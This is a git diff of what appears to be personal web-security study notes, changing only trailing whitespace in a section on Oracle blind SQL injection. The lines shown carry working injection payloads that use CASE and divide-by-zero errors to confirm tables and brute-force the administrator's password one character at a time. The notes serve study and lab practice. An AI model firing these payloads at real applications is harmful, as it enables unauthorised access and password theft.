@@ -104,7 +104,7 @@ We initially send an empty query, if a 500 is returned, we may need to complete 
 `' ||(select '')||'`  
 `' ||(select '' from dual)||'`  
 We can then start to infer information, such as the existence of `users`  
-`'||(SELECT '' FROM users WHERE ROWNUM = 1)||'`
+`'||(SELECT '' FROM users WHERE ROWNUM = 1)||'`  
 We weaponise this using the CASE statement, which will test a condition and if true/false will evaluate an expression.  
 So, in the event that CASE comes out TRUE, we divide by 0 - causing an error.  
 `'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`  
@@ -112,6 +112,6 @@ Now we start to infer the existence of information (users, passwords, tables, et
 `'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`  
 `'||(SELECT CASE WHEN length(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'`  
 Now we bruteforce as before  
-`'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
+`'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`  
 
 ### [Error Based SQLi](https://github.com/kymb0/web_study/blob/master/sqli/error_based_sqli.md)
